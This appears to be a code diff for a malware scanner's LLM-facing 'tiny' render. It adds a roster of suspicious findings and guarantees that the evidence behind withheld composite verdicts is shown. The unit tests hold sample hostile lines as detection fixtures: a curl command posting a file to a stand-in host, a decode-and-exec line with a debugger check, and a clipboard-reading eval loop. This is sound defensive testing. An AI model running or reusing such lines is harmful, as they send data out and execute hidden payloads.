@@ -18,7 +18,7 @@ use crate::types::{
 };
 use anyhow::Result;
 use colored::Colorize;
-use std::collections::{HashMap, HashSet};
+use std::collections::{BTreeSet, HashMap, HashSet};
 
 /// Aggregated finding for a directory path
 #[allow(dead_code)] // Used by binary target
@@ -589,6 +589,20 @@ pub struct TinyOpts {
     /// severity letters, which are the only carrier without color. `false`
     /// (every built-in preset) renders as before.
     pub card: bool,
+    /// Opt-in audit aid: list every suspicious/hostile finding the render
+    /// left out — composites included — as a location-less
+    /// `{marker} SEV desc (id)` line at the top of the file's block.
+    ///
+    /// Off in every built-in preset. The LLM/tiny view (`--format tiny`, and
+    /// scan's `--format interpret`, which renders with [`Self::tiny`]) shows
+    /// evidence, never conclusions: a composite's id, description and grade
+    /// are cleave's own verdict, and a grader shown them agrees with them —
+    /// including when the composite is wrong. What keeps that view complete
+    /// is the leg guarantee instead (`evidence_legs`): every atom a
+    /// suspicious/hostile composite transitively rests on renders in the
+    /// member it matched in, whatever its criticality, so the grader sees all
+    /// the evidence and draws its own conclusion.
+    pub elevated_roster: bool,
 }
 
 impl TinyOpts {
@@ -614,6 +628,7 @@ impl TinyOpts {
             low_tier_fill: 0,
             focus_crit: None,
             card: false,
+            elevated_roster: false,
             windows_per_finding: 0,
             max_windows: 0,
             window_bytes: 0,
@@ -739,10 +754,18 @@ pub fn format_context_badged(
             tiny_path(&report.target.path, opts.basename_root)
         ));
     }
+    // The LLM/tiny view withholds composites; this is the evidence it owes
+    // the reader in their place, per file (see `evidence_legs`).
+    let minimal = matches!(opts.header, HeaderStyle::Minimal);
+    let legs = if minimal {
+        evidence_legs(&report.files)
+    } else {
+        HashMap::new()
+    };
     let files: Vec<&FileAnalysis> = report
         .files
         .iter()
-        .filter(|f| file_has_output(f, opts) || f.identity.is_some())
+        .filter(|f| file_has_output(f, opts) || f.identity.is_some() || legs.contains_key(&f.id))
         .collect();
     if files.is_empty() {
         return gaps;
@@ -791,7 +814,6 @@ pub fn format_context_badged(
     // name, overlay notes, "no symbol table", …) adds no signal and floods the
     // context. Root renders first, so its native findings win; near-identical
     // members then collapse. The terminal view keeps per-member detail.
-    let minimal = matches!(opts.header, HeaderStyle::Minimal);
     let dedup_across_files = minimal;
 
     // The LLM/tiny view spends its context budget on only the highest-scoring
@@ -866,6 +888,29 @@ pub fn format_context_badged(
             });
         }
 
+        // Every suspicious/hostile finding this file owns, for the roster that
+        // guarantees each one reaches the render (`TinyOpts::elevated_roster`).
+        // Ownership mirrors the selection: not an inherited copy of a member's
+        // finding, and — on a container — not native deeper down.
+        let mut elevated: Vec<&Finding> = Vec::new();
+        if opts.elevated_roster {
+            for f in &file.findings {
+                let owned = f.src.is_none() || file.composite_sources.contains_key(f.id.as_str());
+                let deeper = is_container
+                    && id_max_native_depth
+                        .get(f.id.as_str())
+                        .is_some_and(|&deepest| deepest > file.depth);
+                if f.crit >= Criticality::Suspicious
+                    && owned
+                    && !deeper
+                    && elevated.iter().all(|e| e.id != f.id)
+                {
+                    elevated.push(f);
+                }
+            }
+            elevated.sort_unstable_by(|a, b| b.crit.cmp(&a.crit).then_with(|| a.id.cmp(&b.id)));
+        }
+
         // Card layout: a file earns its block only by carrying focus-grade
         // evidence. A member with nothing at `focus_crit` — routine imports,
         // metadata — prints nothing; the artifact's flagged files are the
@@ -896,9 +941,24 @@ pub fn format_context_badged(
             selected.retain(|&id| seen.insert(id));
         }
 
+        // Owed evidence renders here whatever the filters above decided: its
+        // criticality, a container's deeper-member rule, or an earlier copy.
+        let owed: HashSet<&str> = legs.get(&file.id).into_iter().flatten().copied().collect();
+        if let Some(ids) = legs.get(&file.id) {
+            for &id in ids {
+                if !selected.contains(&id) {
+                    selected.push(id);
+                }
+            }
+        }
+
         // Cheap pre-filter: nothing selected, no identity and nothing withheld →
         // nothing to show.
-        if selected.is_empty() && file.identity.is_none() && !has_shown_suppressions(file, opts) {
+        if selected.is_empty()
+            && elevated.is_empty()
+            && file.identity.is_none()
+            && !has_shown_suppressions(file, opts)
+        {
             continue;
         }
 
@@ -972,6 +1032,7 @@ pub fn format_context_badged(
         if let Some(identity) = &file.identity {
             render_identity(&mut body, identity, colorize);
         }
+        let findings_start = body.len();
         // Byte ranges of the source windows the plan draws: a text window
         // renders nearly every row it holds, so evidence inside one is on
         // screen whatever note it carries. Binary windows render only the rows
@@ -994,6 +1055,7 @@ pub fn format_context_badged(
             &windowed,
             &capped,
             &drawn,
+            &owed,
             &id_to_file,
             opts,
             shows_context,
@@ -1004,10 +1066,28 @@ pub fn format_context_badged(
             file_view,
             &context_selected,
             &plan,
+            &owed,
             opts,
             eff_width,
             colorize,
         );
+        // The roster leads the file's findings, listing each elevated finding
+        // the render above did not name. Checked against the rendered text, so
+        // whatever path dropped it — withheld composite, one note per row, a
+        // window cap, cross-file dedup — the finding still surfaces.
+        let marker = comment_marker(&file.file_type);
+        let roster: String = elevated
+            .iter()
+            .filter(|f| !mentions_id(&body[findings_start..], &f.id))
+            .map(|f| {
+                format!(
+                    "{marker} {} {}\n",
+                    f.crit.letter(),
+                    annotate_desc(&terse_description(&f.desc), &f.id)
+                )
+            })
+            .collect();
+        body.insert_str(findings_start, &roster);
         render_suppressions(&mut body, file, opts, colorize);
 
         // Skip a file whose body came out empty: a lone header advertising
@@ -1058,6 +1138,152 @@ pub fn format_context_badged(
         out.push('\n');
     }
     out
+}
+
+/// The atoms `roots`' composites rest on within `file`, resolved through any
+/// nested composites: an id some finding here composes from `trait_refs` is
+/// expanded, every other id is an atom. Roots that are atoms contribute
+/// nothing. A `BTreeSet` so every consumer iterates in one stable order.
+fn composite_atoms<'a>(
+    file: &'a FileAnalysis,
+    roots: impl IntoIterator<Item = &'a Finding>,
+) -> BTreeSet<&'a str> {
+    use crate::types::Istr;
+    let refs_of: HashMap<&str, &[Istr]> = file
+        .findings
+        .iter()
+        .filter(|f| !f.trait_refs.is_empty())
+        .map(|f| (f.id.as_str(), f.trait_refs.as_slice()))
+        .collect();
+    let mut stack: Vec<&str> = roots
+        .into_iter()
+        .flat_map(|f| f.trait_refs.iter().map(Istr::as_str))
+        .collect();
+    let mut seen = HashSet::new();
+    let mut atoms = BTreeSet::new();
+    while let Some(id) = stack.pop() {
+        if !seen.insert(id) {
+            continue;
+        }
+        match refs_of.get(id) {
+            Some(refs) => stack.extend(refs.iter().map(Istr::as_str)),
+            None => {
+                atoms.insert(id);
+            }
+        }
+    }
+    atoms
+}
+
+/// Per file id, the evidence the LLM/tiny view must render in that file: each
+/// suspicious/hostile atom the file matched, and every atom a
+/// suspicious/hostile composite anywhere in the report transitively rests on,
+/// placed in the member where it matched.
+///
+/// The view withholds composites (see `select_ids`), so these atoms are all
+/// that is left of a withheld conclusion; losing one to a criticality floor,
+/// the one-note-per-row rule, dedup or a window cap silently weakened the
+/// evidence a grader weighs. Resolution uses what analysis recorded — no rule
+/// is re-evaluated, and a leg absent from the report (never matched, or
+/// suppressed) resolves to nothing:
+///   - a container's leg that also matched natively in members below it
+///     belongs to the deepest such members, narrowed to the composite's
+///     recorded `composite_sources` members when any of them carry it;
+///   - a native composite leg expands into its own `trait_refs` in place;
+///   - an inherited copy (`src` set) resolves in the member it came from.
+fn evidence_legs(files: &[FileAnalysis]) -> HashMap<u32, BTreeSet<&str>> {
+    use crate::types::file_analysis::ARCHIVE_DELIMITER;
+    let by_id: HashMap<u32, &FileAnalysis> = files.iter().map(|f| (f.id, f)).collect();
+    // Per id, the files it matched natively in.
+    let mut native: HashMap<&str, Vec<&FileAnalysis>> = HashMap::new();
+    for file in files {
+        for f in file.findings.iter().filter(|f| f.src.is_none()) {
+            let homes = native.entry(f.id.as_str()).or_default();
+            if homes.last().is_none_or(|h| h.id != file.id) {
+                homes.push(file);
+            }
+        }
+    }
+    let below = |d: &FileAnalysis, f: &FileAnalysis| {
+        d.path.len() > f.path.len() + ARCHIVE_DELIMITER.len()
+            && d.path.starts_with(f.path.as_str())
+            && d.path[f.path.len()..].starts_with(ARCHIVE_DELIMITER)
+    };
+
+    let mut out: HashMap<u32, BTreeSet<&str>> = HashMap::new();
+    for file in files {
+        for c in &file.findings {
+            let owned = c.src.is_none() || file.composite_sources.contains_key(c.id.as_str());
+            if c.crit < Criticality::Suspicious || !owned {
+                continue;
+            }
+            let sources: HashSet<u32> = file
+                .composite_sources
+                .get(c.id.as_str())
+                .into_iter()
+                .flatten()
+                .map(|s| s.file)
+                .collect();
+            // An elevated atom resolves like a leg: a container's copy of a
+            // member's match belongs to that member.
+            let mut stack: Vec<(&FileAnalysis, &str)> = if c.trait_refs.is_empty() {
+                vec![(file, c.id.as_str())]
+            } else {
+                c.trait_refs.iter().map(|r| (file, r.as_str())).collect()
+            };
+            let mut seen: HashSet<(u32, &str)> = HashSet::new();
+            while let Some((f, id)) = stack.pop() {
+                if !seen.insert((f.id, id)) {
+                    continue;
+                }
+                let homes = native.get(id).map_or(&[][..], Vec::as_slice);
+                let inner: Vec<&FileAnalysis> =
+                    homes.iter().copied().filter(|d| below(d, f)).collect();
+                // Only the deepest: a nested container re-carries its members'.
+                let mut deeper: Vec<&FileAnalysis> = inner
+                    .iter()
+                    .copied()
+                    .filter(|d| !inner.iter().any(|e| below(e, d)))
+                    .collect();
+                if deeper.iter().any(|d| sources.contains(&d.id)) {
+                    deeper.retain(|d| sources.contains(&d.id));
+                }
+                if !deeper.is_empty() {
+                    stack.extend(deeper.into_iter().map(|d| (d, id)));
+                } else if let Some(g) = f
+                    .findings
+                    .iter()
+                    .find(|g| g.src.is_none() && g.id.as_str() == id)
+                {
+                    if g.trait_refs.is_empty() {
+                        out.entry(f.id).or_default().insert(g.id.as_str());
+                    } else {
+                        stack.extend(g.trait_refs.iter().map(|r| (f, r.as_str())));
+                    }
+                } else if let Some(m) = f
+                    .findings
+                    .iter()
+                    .find_map(|g| (g.id.as_str() == id).then_some(g.src).flatten())
+                    .and_then(|m| by_id.get(&m))
+                {
+                    stack.push((m, id));
+                }
+            }
+        }
+    }
+    out
+}
+
+/// Whether `text` names trait `id` as a whole token: not as the prefix of a
+/// longer id (`a::b` inside `a::b-c`) nor the tail of another path.
+fn mentions_id(text: &str, id: &str) -> bool {
+    let is_id_byte =
+        |b: &u8| b.is_ascii_alphanumeric() || matches!(b, b'/' | b':' | b'-' | b'_' | b'.');
+    let bytes = text.as_bytes();
+    text.match_indices(id).any(|(i, _)| {
+        !bytes[..i].last().is_some_and(is_id_byte)
+            && !bytes.get(i + id.len()).is_some_and(is_id_byte)
+    })
 }
 
 /// The LLM `--format tiny` view.
@@ -1471,10 +1697,8 @@ fn relabel_composite_notes(file: &FileAnalysis, selected: &[&str]) -> Option<Vec
         if f.src.is_some() || f.trait_refs.is_empty() || sel.contains(f.id.as_str()) {
             continue;
         }
-        let mine: Vec<(&Finding, Vec<[u64; 2]>)> = f
-            .trait_refs
-            .iter()
-            .map(crate::types::Istr::as_str)
+        let mine: Vec<(&Finding, Vec<[u64; 2]>)> = composite_atoms(file, [f])
+            .into_iter()
             .filter(|r| sel.contains(r) && !located.contains(r))
             .filter_map(|r| {
                 file.findings
@@ -1621,16 +1845,15 @@ fn select_ids<'a>(file: &'a FileAnalysis, opts: &TinyOpts, low_tier_fill: usize)
     //
     // Consumers must therefore read severity from the structured report, never
     // by scanning this render for `H`/`S` letters — most elevated findings are
-    // composites and no longer appear here at all.
+    // composites and no longer appear here at all. Their evidence does: the
+    // legs below, and `evidence_legs` across members.
     let minimal = matches!(opts.header, HeaderStyle::Minimal);
-    let composite_legs: HashSet<&str> = if minimal {
-        file.findings
-            .iter()
-            .filter(|f| !f.trait_refs.is_empty())
-            .flat_map(|f| f.trait_refs.iter().map(crate::types::Istr::as_str))
-            .collect()
+    // Legs resolve through nested composites to the atoms beneath: an
+    // intermediate composite's name is as much a conclusion as the top one's.
+    let composite_legs: BTreeSet<&str> = if minimal {
+        composite_atoms(file, file.findings.iter())
     } else {
-        HashSet::new()
+        BTreeSet::new()
     };
 
     // Per id, keep the best score and the highest criticality seen — the
@@ -2216,11 +2439,13 @@ fn truncate_end(s: &str, max: usize) -> String {
 
 /// Emit the merged context. Source files render line-by-line; binaries render
 /// each match window as raw bytes wrapped into hex|ascii rows at `term_width`.
+#[allow(clippy::too_many_arguments)] // a render primitive; bundling would obscure it
 fn render_context(
     out: &mut String,
     file: &FileAnalysis,
     selected: &[&str],
     plan: &[Option<HashSet<&str>>],
+    owed: &HashSet<&str>,
     opts: &TinyOpts,
     term_width: usize,
     colorize: bool,
@@ -2236,7 +2461,7 @@ fn render_context(
             render_hex_context(out, file, selected, term_width, opts, colorize);
         }
     } else {
-        render_text_chunks(out, file, plan, opts, term_width, colorize);
+        render_text_chunks(out, file, plan, owed, opts, term_width, colorize);
     }
 }
 
@@ -2549,6 +2774,7 @@ fn render_text_chunks(
     out: &mut String,
     file: &FileAnalysis,
     plan: &[Option<HashSet<&str>>],
+    owed: &HashSet<&str>,
     opts: &TinyOpts,
     term_width: usize,
     colorize: bool,
@@ -2687,6 +2913,7 @@ fn render_text_chunks(
                 idx == last && cut_right,
                 &notes,
                 comment,
+                owed,
                 marker,
                 loc_width,
                 content_width,
@@ -2925,6 +3152,7 @@ fn render_source_line(
     cut_right: bool,
     notes: &[&Note],
     comment: Option<&Note>,
+    owed: &HashSet<&str>,
     marker: &str,
     loc_width: usize,
     content_width: usize,
@@ -3038,14 +3266,28 @@ fn render_source_line(
     };
     let match_disp = comment.and_then(|n| to_disp(n.off));
 
-    if let Some(n) = comment.filter(|n| n.crit >= Criticality::Notable) {
+    // The strongest note leads; every other owed note on the row — a
+    // suspicious/hostile atom, or the leg of a withheld composite (see
+    // `evidence_legs`), whatever its grade — follows on its own line. Keeping
+    // only the strongest hid the rest of the row's evidence from the reader.
+    let owes = |n: &Note| owed.contains(n.id.as_str());
+    let mut announced: Vec<&Note> = comment
+        .filter(|&n| n.crit >= Criticality::Notable || owes(n))
+        .into_iter()
+        .collect();
+    for &n in notes {
+        if owes(n) && announced.iter().all(|a| a.id != n.id) {
+            announced.push(n);
+        }
+    }
+    for n in announced {
         out.push_str(marker);
         out.push(' ');
         out.push(n.crit.letter());
         out.push(' ');
         out.push_str(&loc_str);
-        if let Some(col) =
-            match_disp.map(|b| col_base + display.get(..b).map_or(0, |s| s.chars().count() as u64))
+        if let Some(col) = to_disp(n.off)
+            .map(|b| col_base + display.get(..b).map_or(0, |s| s.chars().count() as u64))
         {
             out.push(':');
             out.push_str(&col.to_string());
@@ -3401,6 +3643,7 @@ fn render_no_anchor(
     windowed: &HashSet<&str>,
     capped: &HashSet<&str>,
     drawn: &[(u64, u64)],
+    owed: &HashSet<&str>,
     id_to_file: &HashMap<u32, &FileAnalysis>,
     opts: &TinyOpts,
     context_shown: bool,
@@ -3475,10 +3718,14 @@ fn render_no_anchor(
         .findings
         .iter()
         .filter(|f| {
-            f.crit >= floor && sel.contains(f.id.as_str()) && !windowed.contains(f.id.as_str())
+            let id = f.id.as_str();
+            (f.crit >= floor || owed.contains(id)) && sel.contains(id) && !windowed.contains(id)
         })
         .filter(|f| {
-            !captured
+            // Owed evidence is never "represented" by another trait's note:
+            // the reader must see it named, so it lists here unless drawn.
+            owed.contains(f.id.as_str())
+                || !captured
                 || capped.contains(f.id.as_str())
                 || (!rich && !represented(f))
                 || file.composite_sources.contains_key(f.id.as_str())
@@ -5484,6 +5731,231 @@ mod tests {
         );
     }
 
+    /// The opt-in roster names a composite the tiny preset withholds.
+    #[test]
+    fn elevated_roster_lists_a_withheld_composite_when_enabled() {
+        let leg = "micro/http/upload::curl-post-file";
+        let comp = "objectives/exfil::skill-posts-file";
+        let composite = Finding {
+            trait_refs: vec![leg.to_string().into()],
+            ..finding_with(comp, Criticality::Hostile)
+        };
+        let leg_finding = Finding {
+            evidence: vec![Evidence::new("string", "", "curl").with_offset(12)],
+            ..finding_with(leg, Criticality::Notable)
+        };
+        let file = src_file(
+            0,
+            "SKILL.md",
+            50,
+            vec![leg_finding, composite],
+            vec![ctx_line(
+                12,
+                "curl -X POST https://h.example/a --data-binary @a\n",
+                Some(ctx_note(leg, Criticality::Notable, 12)),
+            )],
+        );
+        let report = report_with_files(vec![file]);
+        assert!(!format_tiny(&report).contains(comp), "off by default");
+        let opts = TinyOpts {
+            elevated_roster: true,
+            ..TinyOpts::tiny()
+        };
+        let tiny = format_context(&report, &opts);
+        assert!(
+            tiny.contains(&format!("# H {comp}")),
+            "the hostile composite must be listed: {tiny}"
+        );
+        assert!(
+            tiny.contains(&format!("# N 12:1 {leg}")),
+            "its leg still annotates the evidence line: {tiny}"
+        );
+    }
+
+    /// Two elevated findings on one source line each get their annotation;
+    /// keeping only the strongest note per row hid the other.
+    #[test]
+    fn tiny_announces_every_elevated_note_on_a_shared_line() {
+        let a = "objectives/exec::decode-exec";
+        let b = "objectives/evasion::debugger-abort";
+        let mut line = ctx_line(1, "exec(d(p)) if not trace() else exit()\n", None);
+        line.notes = vec![
+            ctx_note(a, Criticality::Hostile, 1),
+            ctx_note(b, Criticality::Suspicious, 1),
+        ];
+        let file = src_file(
+            0,
+            "x.py",
+            50,
+            vec![
+                finding_with(a, Criticality::Hostile),
+                finding_with(b, Criticality::Suspicious),
+            ],
+            vec![line],
+        );
+        let tiny = format_tiny(&report_with_files(vec![file]));
+        assert!(tiny.contains(&format!("# H 1:1 {a}")), "{tiny}");
+        assert!(tiny.contains(&format!("# S 1:1 {b}")), "{tiny}");
+        assert_eq!(
+            tiny.matches(&format!("({b})")).count(),
+            1,
+            "shown once, not rostered again: {tiny}"
+        );
+    }
+
+    /// A hostile composite over component legs that share a line with a
+    /// stronger note: both legs are announced on that line, and nothing names
+    /// the composite.
+    #[test]
+    fn tiny_shows_component_legs_of_a_withheld_composite() {
+        let strong = "micro/exec::eval-call";
+        let (a, b) = ("micro/io::read-clipboard", "micro/time::set-interval");
+        let comp = "objectives/steal::clipboard-poll-exfil";
+        let composite = Finding {
+            trait_refs: vec![a.to_string().into(), b.to_string().into()],
+            ..finding_with(comp, Criticality::Hostile)
+        };
+        let mut line = ctx_line(
+            3,
+            "setInterval(()=>eval(navigator.clipboard.readText()))\n",
+            None,
+        );
+        line.notes = vec![
+            ctx_note(strong, Criticality::Notable, 3),
+            ctx_note(a, Criticality::Component, 3),
+            ctx_note(b, Criticality::Component, 3),
+        ];
+        let file = src_file(
+            0,
+            "bg.js",
+            50,
+            vec![
+                finding_with(strong, Criticality::Notable),
+                finding_with(a, Criticality::Component),
+                finding_with(b, Criticality::Component),
+                composite,
+            ],
+            vec![line],
+        );
+        let tiny = format_tiny(&report_with_files(vec![file]));
+        assert!(tiny.contains(&format!("# N 3:1 {strong}")), "{tiny}");
+        assert!(tiny.contains(&format!("# C 3:1 {a}")), "{tiny}");
+        assert!(tiny.contains(&format!("# C 3:1 {b}")), "{tiny}");
+        assert!(!tiny.contains(comp) && !tiny.contains("# H"), "{tiny}");
+    }
+
+    /// Legs resolve through a nested composite to its atoms; neither
+    /// composite's id reaches the render.
+    #[test]
+    fn tiny_resolves_nested_composites_to_their_atoms() {
+        let top = "objectives/exfil::wallet-exfil";
+        let mid = "micro/ui::credential-surface";
+        let (label, post) = ("micro/ui::mnemonic-label", "micro/http::post");
+        let file = src_file(
+            0,
+            "x.js",
+            50,
+            vec![
+                Finding {
+                    trait_refs: vec![mid.to_string().into(), post.to_string().into()],
+                    ..finding_with(top, Criticality::Hostile)
+                },
+                Finding {
+                    trait_refs: vec![label.to_string().into()],
+                    ..finding_with(mid, Criticality::Notable)
+                },
+                finding_with(label, Criticality::Component),
+                finding_with(post, Criticality::Baseline),
+            ],
+            vec![],
+        );
+        let tiny = format_tiny(&report_with_files(vec![file]));
+        assert!(tiny.contains(&format!("({label})")), "{tiny}");
+        assert!(tiny.contains(&format!("({post})")), "{tiny}");
+        assert!(!tiny.contains(top) && !tiny.contains(mid), "{tiny}");
+    }
+
+    /// An archive-scope composite pools legs from two members: each leg
+    /// renders in the member it matched in, not on the container.
+    #[test]
+    fn tiny_places_cross_member_legs_in_their_members() {
+        let comp = "objectives/exfil::form-to-http";
+        let (form, send) = ("micro/ui::form-input", "micro/http::fetch-post");
+        let mut root = src_file(
+            0,
+            "/s/ext.zip",
+            90,
+            vec![
+                Finding {
+                    trait_refs: vec![form.to_string().into(), send.to_string().into()],
+                    ..finding_with(comp, Criticality::Hostile)
+                },
+                // The container's inherited copies of its members' legs.
+                Finding {
+                    src: Some(1),
+                    ..finding_with(form, Criticality::Component)
+                },
+                Finding {
+                    src: Some(2),
+                    ..finding_with(send, Criticality::Component)
+                },
+            ],
+            vec![],
+        );
+        root.file_type = "zip".to_string();
+        root.composite_sources.insert(
+            comp.to_string(),
+            vec![
+                crate::types::file_analysis::CompositeSource {
+                    file: 1,
+                    line: None,
+                    offset: None,
+                },
+                crate::types::file_analysis::CompositeSource {
+                    file: 2,
+                    line: None,
+                    offset: None,
+                },
+            ],
+        );
+        let member = |id: u32, name: &str, leg: &str| {
+            let mut m = src_file(
+                id,
+                &format!("/s/ext.zip!!{name}"),
+                10,
+                vec![finding_with(leg, Criticality::Component)],
+                vec![],
+            );
+            m.depth = 1;
+            m.parent_id = Some(0);
+            m
+        };
+        let files = vec![root, member(1, "login.js", form), member(2, "app.js", send)];
+        let tiny = format_tiny(&report_with_files(files));
+        // A member's block: from its header to the next file header.
+        let block = |name: &str| {
+            let rest = tiny
+                .find(&format!("ext.zip/{name}\t"))
+                .map_or("", |start| &tiny[start..]);
+            let end = rest
+                .get(1..)
+                .and_then(|r| r.find("ext.zip/"))
+                .map_or(rest.len(), |i| i + 1);
+            rest[..end].to_string()
+        };
+        assert!(block("login.js").contains(&format!("({form})")), "{tiny}");
+        assert!(block("app.js").contains(&format!("({send})")), "{tiny}");
+        assert!(!tiny.contains(comp), "{tiny}");
+    }
+
+    #[test]
+    fn mentions_id_matches_whole_ids_only() {
+        assert!(mentions_id("desc (a/b::c)\n", "a/b::c"));
+        assert!(mentions_id("# S a/b::c\n", "a/b::c"));
+        assert!(!mentions_id("desc (a/b::c-d)", "a/b::c"));
+        assert!(!mentions_id("desc (x/a/b::c)", "a/b::c"));
+    }
+
     /// A composite's note covers the one leg it was anchored on. Its other
     /// legs match elsewhere, so handing them the note would label a line with
     /// a trait that is not its evidence (a paste-site leg once annotated a
@@ -5532,11 +6004,11 @@ mod tests {
         );
     }
 
-    /// A leg whose evidence sits inside a drawn source window is already on
-    /// screen, even though the note on that window belongs to another trait:
-    /// it is not listed again as a location-less note.
+    /// A leg whose evidence sits inside a window another trait's note labels
+    /// is on screen but unnamed. A withheld composite's leg is owed evidence,
+    /// so it is still named — once, location-less.
     #[test]
-    fn tiny_does_not_relist_a_leg_whose_evidence_is_drawn() {
+    fn tiny_names_a_leg_whose_evidence_is_drawn_under_another_note() {
         let a = "micro/ps::iex";
         let b = "micro/ps::irm-alias";
         let comp = "objectives/exec::download-cradle";
@@ -5569,7 +6041,9 @@ mod tests {
             tiny.contains(&format!("0:1 {a}")),
             "A labels the line: {tiny}"
         );
-        assert!(!tiny.contains(b), "B is on screen, not relisted: {tiny}");
+        assert_eq!(tiny.matches(b).count(), 2, "B named once: {tiny}");
+        assert!(tiny.contains(&format!("# N {b} ({b})")), "{tiny}");
+        assert!(!tiny.contains(comp), "{tiny}");
     }
 
     /// A window the per-file cap declines to draw must not take its finding
@@ -7070,8 +7544,15 @@ mod tests {
         }];
         let output = format_tiny(&report);
         assert!(output.contains("// H 7:1 a/win desc"), "{output:?}");
-        assert!(!output.contains("b/dominated"), "{output:?}");
-        assert!(!output.contains("dominated desc"), "{output:?}");
+        // A suspicious atom is evidence the tiny view owes its reader, so it
+        // is exempt from dominance there: named once, location-less.
+        assert_eq!(
+            output
+                .matches("// S b/dominated desc (b/dominated)")
+                .count(),
+            1,
+            "{output:?}"
+        );
 
         // Same rule for the terminal view: a dominated finding is suppressed
         // everywhere, never resurrected as a location-less gutter note.
